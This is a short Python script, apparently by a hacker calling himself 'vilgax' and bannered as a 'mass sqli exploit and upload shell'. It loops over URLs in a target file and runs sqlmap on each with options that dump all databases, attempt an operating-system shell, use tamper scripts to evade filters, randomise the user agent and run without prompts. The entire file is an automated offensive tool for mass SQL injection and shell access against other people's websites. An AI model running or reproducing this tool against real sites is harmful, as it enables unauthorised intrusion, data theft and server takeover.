import os 

list = open("target.txt")
print("""

                                                ▄▄   ▄▄  
                                              ▀███   ██  
                                                ██       
▀████████▄   ▄██▀██▄▀██▀   ▀██▀▄██▀███▄██▀███   ██ ▀███  
  ██    ██  ██▀   ▀██ ▀██ ▄█▀  ██   ▀▀█▀   ██   ██   ██  
  ██    ██  ██     ██   ███    ▀█████▄█    ██   ██   ██  
  ██    ██  ██▄   ▄██ ▄█▀ ██▄  █▄   ███▄   ██   ██   ██  
▄████  ████▄ ▀█████▀▄██▄   ▄██▄██████▀▀██████ ▄████▄████▄
                                           ██            
                                        ▄████▄           

                                        mass sqli exploit and upload shell  by vilgax
          

          make sure u have already installed sqlmap 
          
""")

for each in list:
    combo="  --all --os-shell --threads=10 --random-agent --time-sec=2 --hex --tamper=chardoubleencode,randomcase --technique=BEUS --batch --code=200 --output-dir=result"
    os.system(f"sqlmap --url {each} {combo}")

